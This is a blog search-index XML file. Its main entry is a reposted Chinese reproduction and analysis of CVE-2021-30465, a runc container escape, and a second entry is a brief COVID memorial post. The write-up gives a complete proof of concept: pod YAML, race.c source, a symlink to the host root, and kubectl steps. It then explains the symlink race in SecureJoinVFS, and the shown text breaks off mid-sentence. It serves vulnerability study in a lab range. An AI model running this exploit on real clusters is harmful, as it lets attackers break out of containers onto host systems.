<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>致敬英雄共悼逝者逝者安息生者永念</title>
    <url>/posts/3176996243/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p><img src="/posts/3176996243/e496fad1b0a3ab34435bd0e3bcc98c9-2842bad2.png" alt="e496fad1b0a3ab34435bd0e3bcc98c9.png"></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>致敬英雄</category>
      </categories>
      <tags>
        <tag>2020年4月4日</tag>
        <tag>清明节</tag>
        <tag>全国哀悼日</tag>
        <tag>新冠肺炎</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-30465-runc容器逃逸-&lt;=1.0.0-rc94</title>
    <url>/posts/2583720244/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<blockquote>
<p>作者：<a href="https://www.gushiciku.cn/pla/漫谈云原生" target="_blank" rel="noopener">漫谈云原生</a><br>链接：<a href="https://www.gushiciku.cn/pl/gysF" target="_blank" rel="noopener">https://www.gushiciku.cn/pl/gysF</a><br>来源：个人博客<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>近日国外安全研究员发布了可导致容器逃逸的runc漏洞 POC，该漏洞影响runc 1.0.0-rc94以及之前的版本，对应CVE编号：CVE-2021-30465。该漏洞也出来有段时间了，因为时间和其他工作安排的原因，没有在POC爆出的第一时间就进行复现，很是惭愧，随着时间的推移，现在网上也已经有很多的复现文章，我也没时间去过多的看所有的文章，只是参考一些原作者及思路清晰的作为参考，同时结合快速、自动化等特征，希望能够在复现的过程中和别人有点不同的地方。</p>
<h4 id="漏洞本质"><a href="#漏洞本质" class="headerlink" title="漏洞本质"></a>漏洞本质</h4><p>runc 是一个CLI工具，用于根据OCI规范生成和运行容器，该工具被广泛的应用于各种虚拟化环境中，如Kubernets。</p>
<p>该漏洞是由于挂载卷时，runc 不信任目标参数，并将使用 “filepath-securejoin” 库来解析任何符号链接并确保解析的目标在容器根目录中，但是如果用符号链接替换检查的目标文件时，可以将主机文件挂载到容器中。黑客可利用该漏洞能将宿主机目录挂载到容器中，来实现容器逃逸。</p>
<p>在容器层面挂载卷和挂载目录是不一样的。挂载目录，对容器来说，只是简单把目录与容器的目录做映射绑定，而目录的权限还是在主机，需要用户自制维护，手动处理权限等问题。卷 (Volume) 是受控存储，挂载卷后是由容器引擎进行管理维护的，也就是把对应卷的所有权交给了容器引擎（本次漏洞的核心点）。而卷下面的所有操作就包含对存储、目录、软链接等等一系列。而CVE-2021-30465漏洞就是由于runc没有处理好卷下面的资源竞争的问题而导致的。</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h5><p>安装docker及k8s，这里我推荐绿盟开源的云原生攻防靶场，Metarget的名称来源于<code>meta-</code>（元）加<code>target</code>（目标，靶机），是一个脆弱基础设施自动化构建框架，主要用于快速、自动化搭建从简单到复杂的脆弱云原生靶机环境。</p>
<p>「绿盟科技研究通讯」上发布了一篇阐述Metarget的设计理念和技术目标的文章，见<a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&amp;mid=2247489415&amp;idx=1&amp;sn=4aea7b7ecff51710c79037ab07a889bc" target="_blank" rel="noopener">Metarget：云原生攻防靶场开源啦！</a>。</p>
<h6 id="基于metarget安装docker"><a href="#基于metarget安装docker" class="headerlink" title="基于metarget安装docker"></a>基于metarget安装docker</h6><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">./metarget gadget install docker --version 18.06.3 --domestic</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/image-20210629111544234.png" alt="image-20210629111544234"></p>
<h6 id="基于metarget安装k8s"><a href="#基于metarget安装k8s" class="headerlink" title="基于metarget安装k8s"></a>基于metarget安装k8s</h6><figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">./metarget gadget install k8s --version 1.16.5 --domestic</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/20210624174514.png" alt="20210624174514"></p>
<p>安装完成后，执行下面的命令查看是否安装成功</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">kubectl get nodes</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/image-20210625150505809.png" alt="image-20210625150505809"></p>
<h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>本次漏洞因为存在一定的机率问题，使用docker等单个容器管理很难看到效果。故使用K8S的POD能力，对多个容器进行实验。</p>
<p>整体步骤如下：</p>
<p>1.首先需要创建多个容器，一个正常启动的容器c1，以及多个无法正常启动（即image为 <code>donotexists.com/do/not:exist</code> ）的容器c2-c20以及两个volume数据卷teset1和test2，分别挂载在各个容器中；</p>
<p>使用k8s创建POD的方法如下：</p>
<ul>
<li><p>编辑yaml文件</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">vim k8s_attack_pod.yml</span><br></pre></td></tr></tbody></table></figure>

<p>插入如下内容：</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">attack</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">    <span class="attr">terminationGracePeriodSeconds:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c1</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">ubuntu:latest</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">[</span> <span class="string">"/bin/sleep"</span><span class="string">,</span> <span class="string">"inf"</span> <span class="string">]</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">MY_POD_UID</span></span><br><span class="line">            <span class="attr">valueFrom:</span></span><br><span class="line">              <span class="attr">fieldRef:</span></span><br><span class="line">                <span class="attr">fieldPath:</span> <span class="string">metadata.uid</span></span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test2</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c2</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">donotexists.com/do/not:exist</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">[</span> <span class="string">"/bin/sleep"</span><span class="string">,</span> <span class="string">"inf"</span> <span class="string">]</span></span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c3</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">donotexists.com/do/not:exist</span></span><br><span class="line">      <span class="attr">command:</span> <span class="string">[</span> <span class="string">"/bin/sleep"</span><span class="string">,</span> <span class="string">"inf"</span> <span class="string">]</span></span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="string">...</span> <span class="string">//</span> <span class="string">省略c4-c20的容器</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">      <span class="attr">emptyDir:</span></span><br><span class="line">        <span class="attr">medium:</span> <span class="string">"Memory"</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">      <span class="attr">emptyDir:</span></span><br><span class="line">        <span class="attr">medium:</span> <span class="string">"Memory"</span></span><br></pre></td></tr></tbody></table></figure>

<p>上面这个 yaml 文件内容，表示在这个 pod 里创建20个容器，通过 volumes 项可以看到，这20个容器共享两个目录，一个叫 test1,一个叫 test2。</p>
<p>对于容器c1,它使用镜像 ubuntu:latest，对于c2-c20,它使用镜像donotexists.com/do/not:exist，这是个不合法的镜像，所以在pod创建后，c2-c20 容器不会成功创建。只有c1会创建成功。</p>
</li>
<li><p>使用如下命令创建</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">kubectl create -f k8s_attack_pod.yml</span><br></pre></td></tr></tbody></table></figure>

<p>也可以使用如下命令直接创建POD：（本文使用该方式）</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">kubectl create -f - &lt;&lt;EOF</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">    name: attack</span><br><span class="line">spec:</span><br><span class="line">    terminationGracePeriodSeconds: 1</span><br><span class="line">    containers:</span><br><span class="line">    - name: c1</span><br><span class="line">      image: ubuntu:latest</span><br><span class="line">      command: [ "/bin/sleep", "inf" ]</span><br><span class="line">      env:</span><br><span class="line">      - name: MY_POD_UID</span><br><span class="line">        valueFrom:</span><br><span class="line">          fieldRef:</span><br><span class="line">            fieldPath: metadata.uid</span><br><span class="line">      volumeMounts:</span><br><span class="line">        - name: test1</span><br><span class="line">          mountPath: /test1</span><br><span class="line">        - name: test2</span><br><span class="line">          mountPath: /test2</span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="keyword">for</span> c <span class="keyword">in</span> {2..20}; <span class="keyword">do</span></span></span><br><span class="line">cat &lt;&lt;EOC</span><br><span class="line">    - name: c$c</span><br><span class="line">      image: donotexists.com/do/not:exist</span><br><span class="line">      command: [ "/bin/sleep", "inf" ]</span><br><span class="line">      volumeMounts:</span><br><span class="line">        - name: test1</span><br><span class="line">          mountPath: /test1</span><br><span class="line">        - name: test2</span><br><span class="line">          mountPath: /test1/mnt1</span><br><span class="line">        - name: test2</span><br><span class="line">          mountPath: /test1/mnt2</span><br><span class="line">        - name: test2</span><br><span class="line">          mountPath: /test1/mnt3</span><br><span class="line">        - name: test2</span><br><span class="line">          mountPath: /test1/mnt4</span><br><span class="line">        - name: test2</span><br><span class="line">          mountPath: /test1/zzz</span><br><span class="line">EOC</span><br><span class="line">done</span><br><span class="line">)</span><br><span class="line">    volumes:</span><br><span class="line">      - name: test1</span><br><span class="line">        emptyDir:</span><br><span class="line">          medium: "Memory"</span><br><span class="line">      - name: test2</span><br><span class="line">        emptyDir:</span><br><span class="line">          medium: "Memory"</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure>

</li>
</ul>
<p>创建后的POD如下所示。</p>
<p><img src="/posts/2583720244/image-20210625154713348.png" alt="image-20210625154713348"></p>
<p>查看POD创建是否成功：可以看到创建了20个POD，却只有一个成功了；</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">kubectl get pods</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/image-20210625170847587.png" alt="image-20210625170847587"></p>
<p><img src="/posts/2583720244/image-20210625171122361.png" alt="image-20210625171122361"></p>
<p>2、然后准备 一个race.c，并编译成race二进制文件 </p>
<p>race程序的功能就是将参数1传进来的文件修改为参数2传进来的文件，在调用renameat2前，会将参数2设置为一个指向参数3传进来目录的软连接。</p>
<ul>
<li><p>编辑race.c文件</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">vim race.c</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* musl libc does not define RENAME_EXCHANGE */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> RENAME_EXCHANGE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RENAME_EXCHANGE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s name1 name2 linkdest\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">char</span> *name1 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> *name2 = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *linkdest = argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> dirfd = <span class="built_in">open</span>(<span class="string">"."</span>, O_DIRECTORY|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (dirfd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"Error open CWD"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mkdir</span>(name1, <span class="number">0755</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"mkdir failed"</span>);</span><br><span class="line">        <span class="comment">//do not exit</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (symlink(linkdest, name2) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"symlink failed"</span>);</span><br><span class="line">        <span class="comment">//do not exit</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">int</span> rc = syscall(SYS_renameat2, dirfd, name1, dirfd, name2, RENAME_EXCHANGE);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>使用如下命令生成可执行文件</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">gcc race.c -O3 -o race</span><br></pre></td></tr></tbody></table></figure>

</li>
</ul>
<p>3、等待c1容器正常启动之后，将 <code>race</code> copy至c1中</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">kubectl cp race -c c1 attack:/test1/</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/image-20210625172542126.png" alt="image-20210625172542126"></p>
<p>4、并且在c1中生成 <code>/test2/test2</code> 链接文件，指向根目录 <code>/</code> （这里软链接的文件名务必和数据卷名字相同）</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">kubectl exec -ti pod/attack -c c1 -- bash</span><br><span class="line">ln -s / /test2/test2</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/image-20210625172823503.png" alt="image-20210625172823503"></p>
<p><img src="/posts/2583720244/image-20210625172946766.png" alt="image-20210625172946766"></p>
<p>5、然后在c1容器中启动 <code>race</code> 二进制</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">cd test1</span><br><span class="line">seq 1 4 | xargs -n1 -P4 -I{} ./race mnt{} mnt-tmp{} /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/</span><br></pre></td></tr></tbody></table></figure>

<p>这里的作用就是起了四个进程，创建 <code>mnt-tmpX</code> 软链接，指向 <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/</code> ，然后通过系统调用 <code>renameat2</code> 不断交换 <code>mntX</code> 和 <code>mnt-tmpX</code> 两个文件。</p>
<p>这里就是不断的将 mntX 修改为 mnt-tmpX,</p>
<p>而 mnt-tmpX是指向 /var/lib/kubelet/pods/260e7894-84ca-4c73-974e-f10d8b56bad8/volumes/kubernetes.io~empty-dir/目录的软连接。</p>
<p>6、然后新开一个终端，将原先c2-c20的容器镜像设置回一个正常的容器镜像即可（即让c2-c20容器正常启动）</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">for c in {2..20}; do</span><br><span class="line">  kubectl set image pod attack c$c=ubuntu:latest</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/image-20210625183958381.png" alt="image-20210625183958381"></p>
<p>此时能看到attack这个pod中的容器全部正常启动</p>
<p><img src="/posts/2583720244/image-20210625184041481.png" alt="image-20210625184041481"></p>
<p>7、然后查看是否逃逸成功，可以发现没有成功</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">for c in {2..20}; do</span><br><span class="line">  echo ~~ Container c$c ~~</span><br><span class="line">  kubectl exec -ti pod/attack -c c$c -- ls /test1/zzz</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/image-20210629144020120.png" alt="image-20210629144020120"></p>
<p>8、至此，我还没找到原因，这是从别人博客里面粘贴过来的图，应该是会有一部分容器的 <code>/test1/zzz</code> 会被指向宿主机的根目录，逃逸成功的——没搞懂我的环境为什么不可以:(,是否与内核版本，何种版本有关系，之后再尝试几次吧<del>~</del></p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">for c in {2..20}; do</span><br><span class="line">  echo ~~ Container c$c ~~</span><br><span class="line">  kubectl exec -ti pod/attack -c c$c -- ls /test1/zzz</span><br><span class="line">done</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/posts/2583720244/356ed03bdc643f9448b3f6485edc229b1c580a20109f2749daf19a981ce584066dcf0e5171cd6437118ca5365586f572.jpg" alt="img"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>该漏洞是由于挂载卷时，runc 不信任目标参数，并将使用“filepath-securejoin”库来解析任何符号链接并确保解析的目标在容器根目录中。</p>
<p>runc 使用“filepath-securejoin库中的SecureJoinVFS函数来解析传进来的路径是否合法，下面是这个函数的描述</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">// Note that the guarantees provided by this function only apply if the path</span><br><span class="line">// components in the returned string are not modified (in other words are not</span><br><span class="line">// replaced with symlinks on the filesystem) after this function has returned.</span><br><span class="line">// Such a symlink race is necessarily out-of-scope of SecureJoin.</span><br><span class="line">func SecureJoinVFS(root, unsafePath string, vfs VFS) (string, error) {</span><br></pre></td></tr></tbody></table></figure>

<p>正如描述所言，这里存在竞争条件。:)</p>
<p>runc 在调用 SecureJoinVFS 函数解析之后会将源目录挂载到校验通过的目标目录中。</p>
<p>但是如果在调用 SecureJoinVFS 函数解析合法之后，立马用符号链接替换检查的目标文件时，通过精心构造符号链接可以将主机文件目录挂载到容器中。</p>
<h5 id="逃逸流程"><a href="#逃逸流程" class="headerlink" title="逃逸流程"></a>逃逸流程</h5><p>可以看出这应该是一个和条件竞争相关的漏洞，因此我们可以简化一下这个流程，来讨论一下逃逸成功的情况。</p>
<p>首先要了解一点，runc在挂载 volumes 时是不允许将软链接挂载至容器中的，因为runc会跟随软链接指向的地址，将宿主机上的目录挂载至容器中。</p>
<p>因此runc会经过一个 <a href="https://www.gushiciku.cn/jump/aHR0cHM6Ly9naXRodWIuY29tL2N5cGhhci9maWxlcGF0aC1zZWN1cmVqb2luL2Jsb2IvNDBmOWZjMjdmYmEwNzRmMmUyZWViYjNmNzQ0NTZiNGM0OTM5ZjRkYS9qb2luLmdvI0w1Ny1MNjA=" target="_blank" rel="noopener"><code>securejoin.SecureJoinVFS()</code> </a>的函数，先对要挂载的目录进行check，然后再进行mount操作。在这期间就会形成一个先后时间差，从而产生条件竞争。从而可能会发生跟随软链接的行为，将宿主机上的目录挂载至容器中，从而产生逃逸。</p>
<p>知道这一点之后，再来看下POC是如何利用这一点的。</p>
<p>首先要确保攻击container（c1）和恶意创建的container都挂载了相同的volumes（test1和test2）</p>
<p>1、c1在test1数据卷下生成一个 <code>mntX</code> 以及一个指向 <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/</code> 的 <code>mnt-tmpX</code> 软链接，然后不断交换 <code>mntX</code> 和 <code>mnt-tmpX</code> 。并且创建 <code>/test2/test2</code> 指向根目录。</p>
<p>这里的 <code>$MY_POD_UID</code> 虽然是在启动时注入的，但实际上可以通过 <code>/proc/self/mountinfo</code> 来获取</p>
<p><img src="/posts/2583720244/356ed03bdc643f9448b3f6485edc229bd346d78f47c83b93e177989790a27bcd9b9e171daee6967087ac84affacf75a0.jpg" alt="img"></p>
<p>以及这个 <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/</code> 实际上就是宿主机上当前pod的数据卷目录</p>
<p>2、然后当其余容器正常启动时，就会先去挂载test1数据卷到 <code>/test1</code> 目录下，然后挂载test2至 <code>/test1/mntX</code> 中</p>
<p>由于共享一个数据卷的原因，c1就会不断更换当前容器的 <code>/test/mntX</code> 和 <code>/test1/mnt-tmpX</code> 。</p>
<p>因而在test2挂载至 <code>/test1/mntX</code> 时，一开始 <code>securejoin.SecureJoinVFS</code> 检查时是一个正常的文件，于是通过了检测，进行mount操作。</p>
<p>但是在mount操作时 <code>/test1/mntX</code> 被更换成了一个指向 <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/</code> 的软链接。</p>
<p>于是在宿主机上本来是将进行如下操作</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mount("/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2", "/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mntX")</span><br></pre></td></tr></tbody></table></figure>

<p>跟随软链接之后就变成了</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mount("/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2", "/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/")</span><br></pre></td></tr></tbody></table></figure>

<p>于是相当于test2数据卷覆盖了整个 <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/</code> 目录，因此再挂载test2数据卷到 <code>/test1/zzz</code> 目录时，就会进行如下操作</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mount("/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2", "/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/zzz")</span><br></pre></td></tr></tbody></table></figure>

<p>由于之前c1容器创建了 <code>/test2/test2</code> 指向根目录，因此这里的 <code>/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2</code> 其实就是一个指向当前宿主机根目录的软链接，于是以上操作就变成了。（这也是为什么要创建和数据卷同名的软链接文件）</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mount("/", "/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/zzz")</span><br></pre></td></tr></tbody></table></figure>

<p>从而将宿主机根目录挂载到了容器的 <code>/test1/zzz</code> 中，实现了容器逃逸。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>K8S 没有让我们控制挂载源，但我们可以完全控制挂载的目标，所以诀窍是在 K8S 卷路径上挂载一个包含符号链接的目录， <strong>让下一个挂载使用这个新源</strong> ，并且让我们可以访问节点根文件系统。 </p>
<p>poc中yaml文件中的配置</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">volumeMounts:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span>   </span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以看到上述配置会连续挂载test2到不同的目录。</p>
<p>runc 执行以下指令时</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">mount(/var/lib/kubelet/pods/$</span><span class="bash">MY_POD_UID/volumes/kubernetes.io~empty-dir/test2, /var/lib/kubelet/pods/<span class="variable">$MY_POD_UID</span>/volumes/kubernetes.io~empty-dir/test1/mntX)</span></span><br></pre></td></tr></tbody></table></figure>

<p>如果我们race程序执行幸运的话，当我们调用时SecureJoin()，mntX是一个目录，当我们调用mount()时，mntX是一个符号链接，这相当于</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">mount(/var/lib/kubelet/pods/$</span><span class="bash">MY_POD_UID/volumes/kubernetes.io~empty-dir/test2, /var/lib/kubelet/pods/<span class="variable">$MY_POD_UID</span>/volumes/kubernetes.io~empty-dir/)</span></span><br></pre></td></tr></tbody></table></figure>

<p>因为之前 <code>ln -s / /test2/test2</code> 的关系</p>
<p>文件系统现在是这样</p>
